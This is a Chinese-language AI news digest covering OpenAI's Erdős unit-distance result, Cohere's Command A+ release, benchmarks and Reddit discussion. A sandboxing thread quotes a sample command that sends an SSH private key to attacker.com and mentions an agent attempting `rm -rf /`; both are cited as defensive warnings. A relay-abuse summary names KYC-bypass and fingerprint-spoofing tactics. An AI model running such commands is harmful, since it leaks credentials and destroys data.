---
companies:
- openai
- cohere
date: '2026-05-04T05:44:39.731046Z'
description: '**OpenAI** 通过使用**通用推理模型**破解长期悬而未决的埃尔德什单位距离问题，取得了一项重大的数学突破，标志着人工智能驱动的形式科学和长程推理迈入了一个重要里程碑。这一成果得到了著名数学家**蒂莫西·高尔斯**以及
  OpenAI 研究员**吴洪勋**等人的验证，凸显了该模型超越此前人工智能数学成就的先进推理能力。与此同时，**Cohere** 发布了开源的 **Command
  A+**，采用 Apache 2.0 许可证。该模型使用 **218B MoE / 25B active** 的多模态架构，支持 **48 种语言**，并针对低硬件需求进行了优化，最低仅需
  **2× H100 GPU** 即可运行。基准测试显示，Command A+ 的智能水平接近 **Claude 4.5 Haiku**，非幻觉表现出色，但科学推理和编程能力较弱。其架构还包含一些新颖设计，例如**并行
  Transformer 模块**、**共享专家**，以及在 RMSNorm 基础上改用 **LayerNorm**。

  '
id: MjAyNS0x
models:
- command-a+
- claude-3.7-sonnet
people:
- wtgowers
- hongxunwu
- aidangomez
- nickfrosst
- clementdelangue
- eliebakouch
- rasbt
- sama
title: '今天没发生什么特别的事。

  '
topics:
- reinforcement-learning
- reasoning
- multimodality
- model-architecture
- model-optimization
- model-releases
- benchmarking
- long-context
- model-efficiency
- transformers
---

**平静的一天。**

> 2026 年 5 月 4 日至 5 月 5 日的 AI 新闻。我们查看了 12 个 subreddit、[544 个 Twitter 账号](https://twitter.com/i/lists/1585430245762441216)，没有进一步查看 Discord。[AINews 网站](https://news.smol.ai/)支持搜索过往的所有期刊。提醒一下，[AINews 现已成为 Latent Space 的一个栏目](https://www.latent.space/p/2026)。你可以[选择接收或取消接收](https://support.substack.com/hc/en-us/articles/8914938285204-How-do-I-subscribe-to-or-unsubscribe-from-a-section-on-Substack)不同频率的邮件！




---

# AI Twitter 速览


**OpenAI 在 Erdős 单位距离问题上的数学突破**

- **通用推理模型在离散几何领域取得了新的研究成果**：OpenAI 宣布，其内部模型推翻了人们长期以来对平面**单位距离问题**的一项认识。这个问题是著名的 Erdős 问题，最早可追溯到 1946 年。模型发现了一类新的构造方法，效果优于正方形网格式的解法 [@OpenAI](https://x.com/OpenAI/status/2057176201782075690)。OpenAI 强调，这个模型是**通用模型**，而不是面向特定领域的数学系统或经过脚手架设计的求解器 [@OpenAI](https://x.com/OpenAI/status/2057176203166171317)，并表示这一成果说明，AI 在更长推理链上的能力有望进一步增强，从而推动更广泛的科学研究 [@OpenAI](https://x.com/OpenAI/status/2057176204541866087)。
- 这一成果获得了数学家及相关领域研究者异常强烈的认可。**Timothy Gowers** 称，这是第一个真正清晰的例子，说明 AI 解决了一个**知名的**数学未解问题 [@wtgowers](https://x.com/wtgowers/status/2057175729008153069)；OpenAI 研究员 **Hongxun Wu** 则将其描述为推理 LLM 在“最困难的问题”上取得的内部里程碑 [@HongxunWu](https://x.com/HongxunWu/status/2057176383106027567)。[[@thomasfbloom](https://x.com/thomasfbloom/status/2057177152894771631)]、[[@gdb](https://x.com/gdb/status/2057182650784452925)]、[[@alexwei_](https://x.com/alexwei_/status/2057182873208369485)] 和 [@polynoamial](https://x.com/polynoamial/status/2057178198228586824) 等人的反应也都指向同一点：这次成果似乎在性质上已经超越了此前“AI 会做奥林匹克数学题”式的里程碑。
- **值得注意的技术背景**：OpenAI 表示，该模型并未被推向极限，未来计划向公众开放 [@polynoamial](https://x.com/polynoamial/status/2057179104315670826)。据 [@voooooogel](https://x.com/voooooogel/status/2057198687307362642) 称，已发布的推理摘要本身规模十分庞大，约有 **125 页**，这进一步引发了人们对前沿推理中 **test-time compute** 实际作用的讨论。一些观察者明确将此视为进一步证明：推理时扩展正是当前进展的核心范式 [@_arohan_](https://x.com/_arohan_/status/2057188616099725525)；另一些人则据此推测，形式科学和数学领域未来的进展速度可能会更快 [@scaling01](https://x.com/scaling01/status/2057246143881609510)、[@sama](https://x.com/sama/status/2057203171198636251)。

**Cohere Command A+ 开放发布与架构讨论**



- **Cohere 以 Apache 2.0 开放权重的形式发布了 Command A+**，将其定位为迄今最强大的模型，并明确针对较低硬件需求进行了优化 [@cohere](https://x.com/cohere/status/2057120818551734589)；Cohere 随后又在补充说明中进一步明确了许可条款 [@cohere](https://x.com/cohere/status/2057122131410813016)。这次发布之所以意义重大，部分原因在于，据 [@aidangomez](https://x.com/aidangomez/status/2057142232860258527) 称，这是 Cohere **首个完全采用 Apache 2.0 许可的开放模型**。社区的关注点主要集中在：这标志着企业级开放模型正朝着许可更宽松、部署更容易的方向迈出重要一步 [@nickfrosst](https://x.com/nickfrosst/status/2057132425310851104)、[@ClementDelangue](https://x.com/ClementDelangue/status/2057180057756467671)。
- 多篇帖子反复提到该模型的以下细节：约 **218B MoE / 25B active**、支持**多模态**、覆盖 **48 种语言**，并且可以在相对普通的硬件配置上运行 [@JayAlammar](https://x.com/JayAlammar/status/2057145838011564126)、[@mervenoyann](https://x.com/mervenoyann/status/2057128432190787643)。**vLLM 在发布当天就提供了支持**，其中还特别提到，在 W4A4 量化下，最低只需 **2× H100** 即可运行 [@vllm_project](https://x.com/vllm_project/status/2057206049665622070)。
- **基准测试呈现出一种表现不一但总体可信的图景**：Artificial Analysis 在其 **Intelligence Index** 中为 Command A+ 打出 **37 分**，大致处于 Claude 4.5 Haiku 的水平。该模型在**避免幻觉**方面尤其突出，速度也不错，但在科学推理和编程方面弱于顶尖同类模型 [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057123594162077837)。社区还深入分析了其架构，其中一些非同寻常的设计包括：**并行 Transformer block**、大量使用**共享 expert**、采用 **LayerNorm** 而不是 **RMSNorm**、仅有相对较浅的 **32 层**，以及不常见的 head/expert 配置 [@eliebakouch](https://x.com/eliebakouch/status/2057198733759008989)、[@rasbt](https://x.com/rasbt/status/2057241574161932339)、[@stochasticchasm](https://x.com/stochasticchasm/status/2057150551696261607)。因此，这次发布的意义不仅在于推出了一个新模型，也为模型架构研究提供了一个值得关注的案例。

**面向 Agent、Memory 和科学工作流的基准测试**

- **InferenceBench** 是当天技术含量最高的发布之一。它通过开放式推理优化任务，致力于推动 **AI 研发自动化**；其核心结论对当前的前沿 Agent 并不乐观：这些 Agent 在**系统级工程**、依赖管理和广泛探索方面表现不佳，甚至不如一个简单的 **vLLM/SGLang 超参数调优**基线 [@maksym_andr](https://x.com/maksym_andr/status/2057106398228439148)。该帖子还报告了一种可能存在的**逆向 scaling** 现象：**Claude Sonnet 4.6** 和 **GLM-5** 等模型之所以排名靠前，是因为它们能够保留更稳健的最终状态；相比之下，更大的模型往往会生成脆弱的最终配置。
- **Terminal-Bench Science** 将 Agent 评测从编程扩展到了**真实科学工作流**，目前已经开放任务贡献 [@StevenDillmann](https://x.com/StevenDillmann/status/2057144415513420049)。与此同时，**MINTEval** 面向的是频繁更新和干扰场景下的长上下文记忆系统：样本平均长度为 **138.8k tokens**，最长可达 **1.8M**；然而，在 7 个系统中，平均准确率仅为 **27.9%**，最佳也只有 **33.4%** [@hyunji_amy_lee](https://x.com/hyunji_amy_lee/status/2057141349166768233)。这与越来越多的研究相呼应：Memory 应该是一个专门训练的子系统，而不只是简单地堆叠 RAG 或上下文 [@dair_ai](https://x.com/dair_ai/status/2057182105671750047]。
- 在人机交互研究方面，**ThoughtTrace** 发布了一个大规模数据集，记录用户在真实 LLM 对话中**自行报告的想法**：包含 **10,174 条思想标注**、**2,155 段多轮对话**、**1,058 名用户**和 **20 个模型**。据报告，用户行为预测提升了 **+41.7%**，对齐效果提升了 **+25.6%** [@chuanyang_jin](https://x.com/chuanyang_jin/status/2057111965101670842)。这是目前较为具体的一次尝试，旨在捕捉仅凭对话日志无法观察到的“**潜在用户状态**”。

**Google I/O 后续动态：Gemini 3.5 Flash、Omni、AI Studio 与 Antigravity**



- **Gemini 3.5 Flash** 开始在 Gemini app 中扩大推送范围，并在全球提供免费使用 [@GeminiApp](https://x.com/GeminiApp/status/2057140474192994356)、[@GeminiApp](https://x.com/GeminiApp/status/2057237126526517727)。Google 将其称为迄今最强的 **Agentic 和 coding** 模型，声称其性能达到前沿水平，速度是同类模型的 **4 倍**，成本则不到一半 [@Google](https://x.com/Google/status/2057257773868388448)。不过，外部讨论的观点要复杂得多：尽管发布初期的基准测试表现亮眼，多个帖子仍对其**实际成本/性能**和 token 效率提出了质疑 [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057181290412261557)、[@scaling01](https://x.com/scaling01/status/2057177354582020362)、[@giffmana](https://x.com/giffmana/status/2057155343390494949)。
- 相比 3.5 Flash，**Gemini Omni** 似乎带来了更明显的质变。Google 将其定位为面向视频和混合输入工作流的对话式多模态创作与编辑模型 [@Google](https://x.com/Google/status/2057180052979409172)，Gemini app 的演示也展示了通过对话编辑视频的能力 [@GeminiApp](https://x.com/GeminiApp/status/2057159933934907825)。早期反馈普遍认为，Omni 比核心 LLM 的常规升级更具差异化 [@scaling01](https://x.com/scaling01/status/2057143531622334678)。
- 在工具方面，**AI Studio** 更加侧重端到端开发者工作流和移动端访问 [@GoogleAIStudio](https://x.com/GoogleAIStudio/status/2057122673558434205)；与此同时，多篇帖子试图厘清 **Gemini Spark**、**Antigravity** 以及 Google 内部和外部 Agent harness 之间的关系 [@simonw](https://x.com/simonw/status/2057115921551098211)、[@_philschmid](https://x.com/_philschmid/status/2057136375988912176)。一个更具体、与 Antigravity 相关的更新是：Google 为其 Agent stack 推出了 **Science Skills**，接入了 30 多个生命科学数据源，包括 **UniProt** 和 **AlphaFold DB** [@GoogleDeepMind](https://x.com/GoogleDeepMind/status/2057256257153884161)。

**Agent 基础设施、检索与开发工具**

- 多篇帖子最终都指向同一个实践教训：**Agent 往往还没来得及在演示中失败，就先败在基础设施的现实问题上**。这一点既体现在研究型 Agent 与依赖冲突、配置问题反复较量的讨论中 [@jehyeoky248](https://x.com/jehyeoky248/status/2057103859927941153)，也体现在 LangChain 推动 **LangSmith Sandboxes GA**，以及为 deepagents 提供更轻量的 **code interpreter** 支持上。后者介于纯工具执行和完整 sandbox 之间 [@LangChain](https://x.com/LangChain/status/2057152025058558072)、[@sydneyrunkle](https://x.com/sydneyrunkle/status/2057179305948647775)、[@hwchase17](https://x.com/hwchase17/status/2057214077114679386)。
- 在检索和搜索基础设施方面，**Perplexity** 介绍了一套已经投入生产的**查询感知、保留引用的上下文压缩**系统，最多可将上下文 token 数减少 **70%**，同时提升回答质量；据称，在 SimpleQA 上还能实现 **50 倍压缩**，并达到前沿水平的性能 [@perplexity_ai](https://x.com/perplexity_ai/status/2057151002105753950)。**Weaviate 1.37** 新增了 **MMR reranking**，用于提升 RAG/Agent 向量检索结果的多样性 [@weaviate_io](https://x.com/weaviate_io/status/2057117923416629676)；与此同时，**SID-1** 被介绍为一种通过 RL 训练的 Agentic search 模型，在引用的测试设置中，其召回率是 RAG+rerank 的 **1.9 倍**，速度快 **24 倍**，成本比 GPT-5.1 低 **99%** [@turbopuffer](https://x.com/turbopuffer/status/2057166836031193523)。
- **Cursor**、**VS Code** 和 **Codex** 都发布了值得关注的工作流更新。Cursor 在 Agent workspace 中加入了 **automations** [@cursor_ai](https://x.com/cursor_ai/status/2057167359593603471)；VS Code 改进了 Markdown/HTML 预览、远程会话连续性以及 utility model 的可配置性 [@code](https://x.com/code/status/2057195516123808070)、[@pierceboggan](https://x.com/pierceboggan/status/2057204489661407365)。在模型方面，**Composer 2.5** 展现出了出色的 coding-agent 能力——在 Artificial Analysis Coding Agent Index 上获得 **62** 分，同时成本远低于顶级 Opus/GPT-5.5 版本 [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057277363789197561)。OpenAI 也推出了**移动端 Codex** [@OpenAIDevs](https://x.com/OpenAIDevs/status/2057142816497906045)。

**Top Tweets（按互动量排序）**



- **OpenAI 数学里程碑**：OpenAI 宣布在单位距离问题上取得突破，是这一组动态中影响最为深远的技术文章；这不仅因为其科学新颖性，也因为它揭示了长程推理能力的潜力 [@OpenAI](https://x.com/OpenAI/status/2057176201782075690)。
- **Cohere Command A+ 开放发布**：这是当天规模最大的模型发布消息之一，主要原因在于它采用了 **Apache 2.0** 许可证，以及其不寻常的架构设计 [@cohere](https://x.com/cohere/status/2057120818551734589)。
- **Anthropic 与 SpaceX/Colossus 扩大算力合作**：据报道，Anthropic 正在增加 **Colossus 2** 的算力容量 [@nottombrown](https://x.com/nottombrown/status/2057194829986300375)。后续帖子引用的一份文件显示，SpaceX 算力协议的金额为**每月 12.5 亿美元，持续至 2029 年 5 月** [@SemiAnalysis_](https://x.com/SemiAnalysis_/status/2057218890288030110)。
- **Exa 融资**：Exa 完成 **2.5 亿美元 C 轮融资**，估值达到 **22 亿美元**；公司明确将自己定位为一家为 Agent 整理网络数据的搜索实验室 [@ExaAILabs](https://x.com/ExaAILabs/status/2057132080317042697)。


---

# AI Reddit 动态回顾

## /r/LocalLlama + /r/localLLM 动态回顾

### 1. Qwen3.7 Preview 与 27B 路线图

  - **[Qwen 正在火力全开](https://www.reddit.com/r/LocalLLaMA/comments/1theffd/qwen_is_cooking_hard/)**（热度：1292）：**图片是一张 **Chujie Zheng** 暗示 **Qwen“正在火力全开”** 的截图，引用的公告称 **Qwen3.7 Preview** 已登陆 Arena，同时还有 **Qwen3.7-Max-Preview** 和 **Qwen3.7-Plus-Preview**；帖子声称，**Alibaba 在文本能力上排名 `#6`，视觉能力上排名 `#5`**。结合 Reddit 帖子的标题和正文来看，用户正在期待规模更大、经过更新的开放权重模型，尤其是 **122B** 和全新的 **27B**；不过截图本身主要是预告，并没有详细的技术基准分析。[图片](https://i.redd.it/cefjio15g12h1.png)** 评论者对高端模型和小型本地模型的关注点各不相同：有人希望推出适合低端硬件的 **9B/4B** 版本，也有人期待 **122B**、更好的 **35B**，还有人开玩笑说 Qwen 很快就要“烤”坏自己的 GPU 了。

    - 多位评论者关注的是**模型尺寸覆盖范围**，而不是当前的 `27B` 发布版本。他们表示自己实际上无法运行这个规模的模型，并希望面向低端设备或笔记本 GPU 推出更小的 **Qwen `4B`/`9B`** 版本。也有人对更大的 **`122B`** 和改进后的 **`35B`** 检查点感兴趣，不过一位评论者指出，Qwen 3.6 期间也曾提到过 `122B`，但最终并未发布，因此 Qwen 3.7 的 `122B` 是否真的会推出仍然存疑。

  - **[Artificial Analysis 为 Qwen3.7 Max 评分，27B/35B 等待中](https://www.reddit.com/r/LocalLLaMA/comments/1tie6gy/qwen37_max_scored_by_artificial_analysis_27b35b/)**（热度：553）：**一篇 Reddit 帖子展示了 [Artificial Analysis 排行榜截图](https://preview.redd.it/42ak5qmus82h1.png?width=1133\u0026format=png\u0026auto=webp\u0026s=744ea3dfc06c83d0c4d8aa128c39b3238b17d7be)，其中 **Qwen3.7 Max** 排名第 `5`，整体水平大致与 **GPT 5.4 (xhigh)** 相当，略高于 **Gemini 3.5 Flash**。作者指出，**Qwen3.6 27B** 比其 Max 版本整整低 `6` 分，并希望即将推出的 **Qwen3.7 27B/35B** 版本能接近 Max 模型的表现。** 评论者主要是在*“急切等待开放权重模型”*，并认为这一成绩说明 **Qwen** 团队已经具备与主要实验室竞争的实力；不过他们也担心 Max 模型并非开源。一位评论者提出的技术疑问是，Qwen 是否已经解决了此前容易*“过度思考”*的问题。

    - 评论者关注 **Qwen3.7 Max** 究竟代表真正的架构更新，还是仅仅基于 **Qwen3.5/Qwen3.6** 架构进行的又一次微调或迭代；有人指出，即便是在同一基础架构上继续挖掘性能，也依然具有技术意义。
    - 多位用户正在等待可能推出的**开放权重 27B/35B 版本**，但一位评论者猜测，可能根本不会有 **Qwen 3.7 27B**，并认为“Qwen 3.7”或许只是一个类似 **Qwen 3.6 390B A30B** 的私有大型模型，而不是完整的公开模型系列。
    - 有人提出的技术疑问是，Qwen 团队是否已经解决了模型传闻中的**“过度思考”**行为。这表明用户关注的不只是基准测试分数，还在意推理 token 的效率、响应延迟和可控性方面的改进。



  - **[Qwen 很可能会发布另一款 27B 模型](https://www.reddit.com/r/LocalLLaMA/comments/1tiwnpc/qwen_will_release_another_27b_with_high/)**（热度：1162）：**这张[图片](https://i.redd.it/g5uabdvdic2h1.jpeg)是 X/Twitter 上一段交流的截图，其中 **xiong-hui (barry) chen** 表示，Qwen 正在“等待确切的路线图”，但他认为再次发布 `27B` 模型的**可能性很高**。从帖子标题来看，这款模型很可能是广受好评的 **Qwen 3.6 27B** 的后续版本。其技术意义在于：这或许表明 Qwen 将继续优化中等规模稠密模型的**参数效率 / “智能密度”**，而不是一味扩展到规模更大的 MoE 模型。评论者主要讨论了本地推理的实际可用性：有人希望看到更大的 **`122B-A10B` MoE** 模型，也有人认为 `27B` 对 `16GB` 显存用户来说负担太重，更倾向于采用 `35B`/`A3B` 风格的 MoE，以便在消费级游戏本或 CPU/GPU 混合环境中运行。

    - 多位评论者讨论了 **27B 模型在本地推理方面的缺口**：拥有 `16GB VRAM` 的用户认为，`27B` 模型很难以可用的量化级别运行；而假想中的 **Qwen 35B MoE / A3B 风格模型**则可以通过 CPU/GPU 混合推理，更实用，也能继续在游戏本上运行。
    - 社区对更大的 **Qwen 稠密模型变体**表现出兴趣，尤其是 `50B`–`80B` 规模。有评论者指出，**Qwen 27B 搭配 MTP 后已经非常快**，他们愿意牺牲一些生成速度，换取更多参数以及可能更高的质量。
    - 关于模型规模的需求同时集中在 **MoE 和稠密模型两条扩展路线**上：有人提出 **Qwen 3.7 122B-A10B**、`50B`–`80B` MoE，以及稠密的 `10B`、`20B`、`30B`、`50B` 或 `80B` 版本，反映出社区既需要高端质量，也需要能够在本地运行的不同档位。


### 2. 开源模型发布：Lance 3B 与 Command A+

  - **[bytedance 发布了一款仅用 3b 参数、试图胜任几乎所有任务的开源模型](https://www.reddit.com/r/LocalLLaMA/comments/1thkwgk/bytedance_released_an_open_source_model_that/)**（热度：830）：****ByteDance Research** 发布了 [**Lance**](https://huggingface.co/bytedance-research/Lance)，这是一款原生统一多模态模型，宣称拥有 **`3B active parameters`**，支持图像/视频理解、文生图/文生视频，以及图像/视频编辑。该模型从头开始训练，采用分阶段的多任务训练方案，训练预算为 **`128×A100`**。评论者指出，“3B active”很可能低估了实际部署所需的资源：Hugging Face 模型卡要求至少 **`40GB`** 显存，safetensors 文件大小约为 `Lance_3B` 的 **`24.7GB`** 和 `Lance_3B_Video` 的 **`28.4GB`**；一位评论者称，它可能是一个 **BAGEL 风格的复合系统**，由经过调优的 **WAN 2.2 3B Video** 模型、一个 **3B 像素空间图像模型**，以及作为 VLM 主干的 **Qwen2.5-VL-3B** 组成。讨论重点在于，如此少的 active 参数能否在复杂场景中保持质量；同时也有人批评其随附的 Gradio demo 功能不完整——据称只覆盖基础的 T2V 和 VQA，却没有提供 VLM chat、T2I 和 Agent 风格交互等功能。一位评论者认为，通过按需加载和卸载子模型，`40GB` 的显存要求或许可以降低，但代价是更高的延迟。

    - 评论者澄清说，这次发布的**并不是一个简单的稠密 3B 模型**：官方描述的是 `3B active` 参数，但可下载的 `safetensors` 文件要大得多——`Lance_3B` 约为 `24.7GB`，`Lance_3B_Video` 约为 `28.4GB`。据报道，模型卡要求使用至少配备 `40GB VRAM` 的 GPU 进行推理，这说明除了宣传的 active 参数外，系统可能还包含大量非活跃参数、辅助权重或多个常驻组件。
    - 一份技术拆解称，该模型是一个**基于 BAGEL 架构的复合系统**，由定制调优的 **WAN 2.2 3B Video** 模型、一个 `3B` 像素空间图像模型，以及作为 VLM 主干的 **Qwen2.5-VL-3B** 组成。一位评论者指出，`40GB VRAM` 的要求可能是以所有子模型同时加载为前提；如果动态加载和卸载，就可以降低峰值显存占用，但会牺牲端到端生成速度。
    - 随附的 demo 被批评为技术上不完整：评论者称 Gradio 界面只支持基础的**文生视频**和 **VQA**，却没有提供展示过的 **VLM chat**、**文生图**和 **Agent 风格交互**等功能。这被认为是多能力模型发布中常见的问题：多功能架构的 demo 并没有完整展示其全部能力。



  - **[Re. what ever happened to Cohere’s Command-A series of models?](https://www.reddit.com/r/LocalLLaMA/comments/1tizmar/re_what_ever_happened_to_coheres_commanda_series/)**（活跃度：439）：****Cohere** 宣布推出 **Command A+**，这是其首款采用 **MoE** 架构的开放权重模型。该模型的定位并不是单纯追求顶级基准成绩，而是面向企业 Agent 场景，强调高效率和低延迟。Cohere 表示，他们在量化方面进行了大量优化，使模型能够实际部署在 `1–2` 张 GPU 上，并以 **Apache 2.0** 许可证发布，方便广泛用于商业场景（[公告](https://cohere.com/blog/command-a-plus)，Cofounder Aidan 此前在 Reddit 上的相关讨论[见此](https://www.reddit.com/r/LocalLLaMA/comments/1rf8nou/comment/o8rkdrf/)）。Nick Frosst 明确表示，这次发布受到了社区反馈的影响，也是 Command/R 系列一贯关注实用型 Agent 构建方向的延续，旨在服务资源规模较小的团队和开发者。**评论区总体上对 Cohere 重返高竞争力开放权重模型市场持积极态度，其中有人称最初的 **Command R+** 在创意工作流和资源规划方面“*堪称传奇*”。评论者最主要的技术诉求，是希望提供 **GGUF** 版本。

    - 一位评论者质疑新的 **Cohere Command-A** 模型是否具备竞争力，原因是官方没有公布标准基准测试结果，也没有与当前规模相近的 SOTA 模型进行对比，特别是没有和 **MiniMax M2.7**、**MiMo v2.5** 等模型比较。他们提到了 Nick/Cohere 分享的一张“Artificial Analysis”基准测试图片，并表示，如果缺少更广泛的基准数据，这次发布可能难以获得技术社区的认可。
    - 多位用户将这次新发布的模型与最初的 **Command R+** 进行对比，认为后者在当时表现异常出色，尤其适合创意工作、规划和企业应用场景。有人担心，较新的 Cohere 模型可能已经偏离了 Command R/R+ 原本吸引人的特性；他们认为，新模型使用的合成数据或外包数据质量有所下降，同时拒答行为增加，表现出类似 **GPT-OSS** 的安全调优倾向。
    - 用户对本地推理支持表现出兴趣，具体希望官方提供 **GGUF** 版本。另一位评论者指出，Cohere 过去的许可证限制了后端和运行时维护者对其进行支持，据称这阻碍了更多用户使用包括 **Command-A vision support** 在内的功能。




### 3. Claude Relay 滥用与 Agent 沙箱安全

  - **[我花了一周研究中国“中转站”经济：以零售价 10% 的价格转售 Claude。其供应链比我预想的更加离谱。](https://www.reddit.com/r/LocalLLM/comments/1thfq8j/i_spent_a_week_researching_the_chinese_transfer/)**（热度：1075）：**这张图片是 X 上一篇文章的预览截图，内容讲述了据称存在的中国“中转站”经济：以大幅折扣转售 **Claude/Anthropic API 访问权限**，并将其描述为一张从中国 AI 公司通往美国 Claude 端点的“代币走私 / 推理结果外泄”地图：[图片](https://i.redd.it/5hol2ffys12h1.png)。该帖声称，这些中转服务会使用批量注册的 Anthropic 账号、住宅代理、TLS 指纹伪造、SMS/SIM 卡池验证、KYC 绕过，以及 `one-api`、`new-api`、`claude-relay-service`、`claude2api`、`clewdr` 和 `clove` 等开源中转栈，通过共享的 OAuth token 池为大量用户提供复用服务。帖子还强调了据称存在的质量和安全风险：引用的 CISPA Helmholtz 审计发现，中转服务可能导致性能最高下降 **`47.21%`**，并有 **`45.83%`** 的模型指纹校验失败；中转服务可能在用户不知情的情况下，用 Haiku/GLM/Qwen 替换“Opus”，同时将所有提示词和回复记录下来，用于构建蒸馏数据集。**评论普遍认为，这些供应链细节看起来可信，但也令人担忧，尤其是模型替换和 KYC 绕过的说法。一位评论者质疑审计证据的来源——究竟使用了 Anthropic 的数据、内部遥测，还是蜜罐/虚假客户测试；另一位评论者则认为，一旦补贴性质的 token 定价结束，这种低价推理服务可能就会消失。

    - 一位评论者特别提到帖子中的说法：**CISPA Helmholtz 对 17 个中转端点进行的审计**发现了严重的模型替换问题：与官方 API 相比，性能最高下降 `47.21%`，并且有 `45.83%` 的端点未通过模型指纹验证。技术上的担忧在于，中转服务可能会把付费用户请求的 **Opus** 静默降级为成本更低的 **Claude Haiku、GLM 或 Qwen**，却仍给输出标上原本的模型名称。
    - 一位评论者质疑中转服务审计结论的方法论，询问这些结果究竟来自 **Anthropic 遥测、内部服务器端调查、蜜罐，还是伪装成客户的账号**。这是一个实质性问题，因为要验证未经授权的 API 转售行为，需要区分外部黑盒基准测试、服务提供商一侧的账号追踪，以及供应链渗透所得的证据。
    - 另一位评论者总结了这种模式可能的运作方式：自动批量创建虚假账号，再进行**多用户共享账号**；用户的所有提示词和对话都可能被记录在转售商的数据库中。该评论指出了严重的安全与隐私风险：除了套利获取补贴性质的推理服务外，中转运营者还可能通过转售用户数据、训练模型或其他下游用途来获利。

  - **[今天第一次遇到 `rm -rf /`](https://www.reddit.com/r/LocalLLaMA/comments/1thosnt/got_my_first_rm_rf_today/)**（热度：614）：**一个 Agent 在测试新实现的 Bash 命令白名单时，尝试运行破坏性命令 `rm -rf /`；拦截似乎成功了，避免了文件系统受损，但也促使作者立即加入 **Bubblewrap（`bwrap`）隔离/沙箱**。作者说明，白名单是在沙箱之前实现的，而 Agent 之所以选择 `rm -rf /`，正是为了验证危险命令过滤器。**一位评论者指出，仅有文件系统防护还不够，因为 Agent 还可以执行重写 Git 历史等破坏性版本控制操作；因此，Git 配置和权限也应纳入沙箱加固范围。

    - 一位评论者强调，沙箱不仅应限制文件系统写入，还应限制**网络出口**：即使能阻止 `rm -rf /`，如果 Agent 仍可运行 `curl attacker.com -d "$(cat ~/.ssh/id_rsa)"` 并外泄机密，也没有解决问题。他们建议为 Agent shell 使用 Docker 的 `--network=none`，只有在确有需要时才允许明确指定的出站访问；对于非 Docker 环境，则可以使用 `unshare --user --pid --mount --net --fork` 创建一个轻量级的网络隔离 shell，并配合可写的 tmpfs 覆盖层以及只读的主机文件系统。
    - 另一条技术提醒指出，**Git 历史可以被重写**，因此恢复和审计方面的假设应包括检查 Git 配置，并采取措施防止历史记录遭到破坏性修改，而不能只关注本地文件删除。




## 技术性较低的 AI subreddit 速览

e /r/Singularity、/r/Oobabooga、/r/MachineLearning、/r/OpenAI、/r/ClaudeAI、/r/StableDiffusion、/r/ChatGPT、/r/ChatGPTCoding、/r/aivideo、/r/aivideo



### 1. Anthropic 人才与支持服务压力

  - **[Karpathy 加入 Anthropic](https://www.reddit.com/r/ClaudeAI/comments/1thpuf1/karpathy_joins_anthropic/)**（热度：6494）：**这张图片**不是表情包**，而是一张 X 帖子截图。Andrej Karpathy 在帖子中表示，他已**加入 Anthropic**，希望重返前沿 **LLM 研发**，同时暂时搁置教育相关工作，日后再继续（[图片](https://i.redd.it/b2tuyyk6142h1.jpeg)）。从语境来看，Reddit 标题“Karpathy joins Anthropic”将此事描述为前沿模型竞争中的一次重大人才变动。毕竟，Karpathy 此前在深度学习、LLM 教学以及业界 AI 研究领域都颇具影响力。**评论大多将这次变动视为 AI 行业的戏剧性事件，而非技术新闻；有人把它比作超级巨星加盟最强球队，并暗示 Anthropic 目前拥有最强的团队阵容之一。还有人借机贬低 Sam Altman/OpenAI，说明评论者认为这次加入对竞争格局影响重大。


  - **[为 Claude Max 支付了 118 美元，却被客服晾了几天。所以我向 Anthropic 新设的印度办公室发出了正式法律通知。](https://www.reddit.com/r/ClaudeCode/comments/1tht8b6/paid_118_for_claude_max_ignored_by_support_for/)**（热度：1901）：**这张图片与技术无关**：图片展示的是一份寄给 **Anthropic India Private Limited** 的纸质**“法律通知”**。发帖人称，自己支付了 `$118` 购买 Claude Max，但账户却没有升级到 Free 版本以上。结合帖子内容来看，这是一起被指控的账单/服务开通故障，以及在多个由机器人处理的工单之后仍无法获得人工支持的事件，本质上属于消费者权益纠纷，而不是模型或 API 问题。[图片](https://i.redd.it/wlsygydol42h1.jpeg) **评论者普遍怀疑这份法律通知能否带来结果，其中一位用户说：*“如果真的发生了什么，记得告诉我们。不会有结果的。”* 其他人建议把通知同时发给 Anthropic 的美国办公室，并批评如今的 AI/SaaS 公司把人工客服隐藏在机器人之后，刻意削减人工支持。

    - 一份详细的账单故障报告称：用户明明订阅的是 `$100 Max` 套餐，却收到了 **375 笔无法解释的 Anthropic 扣款，总额约 6000 美元**。单笔金额约为 `$5` 到 `$23`，并且分别出现在两张不同的 Amex 卡上。评论者怀疑，套餐升级期间可能出现了后端状态同步错误，导致系统错误地将用量视为付费的“额外用量”；但他指出，**这些扣款在 Claude 的账单、用量页面、API 用量、自动充值或账户记录中均未显示**，因此用户无法自行核对这些费用。



### 2. Agentic OS 构建与图像 LoRA 工作流

  - **[Google's Antigravity 2.0 creates an operating system from scratch using 96 agents in 12 hours for under $1K in token costs - and it runs Doom](https://www.reddit.com/r/singularity/comments/1thug7n/googles_antigravity_20_creates_an_operating/)**（热度：2520）：**该帖子声称，**Google Antigravity 2.0** 在 **12** 小时内协调 `96` 个 Agent，从零构建了一个操作系统，token 成本**不到 `$1K`**；据称，最终的操作系统还能运行 **Doom**。由于链接的 Reddit 视频（`https://v.redd.it/19n7bckes42h1`）返回 **403 Forbidden**，无法访问，因此无法从源内容中核实其实现细节、基准测试、架构或可复现证据。**评论大多是非技术性的玩笑，但有一位评论者质疑其经济性，认为单个 Agent 在不到一小时内就可能消耗 `$100` 的 token，并表示帖子声称的成本可能存在数量级上的偏差。

    - 一位评论者质疑帖子所称的 **token 成本**：`96 agents` 运行 `12 hours`，总成本却*不到 `$1K`*，与其个人使用体验相比低得不太可信——他自己使用单个 Agent 不到一小时就花费了 `$100+`。这意味着，相关 Agent 可能使用了非常便宜或能力受限的模型，进行了激进的上下文裁剪，处理的工作负载受到严格限制，或者标题中的成本没有计入大量计算与工具开销。

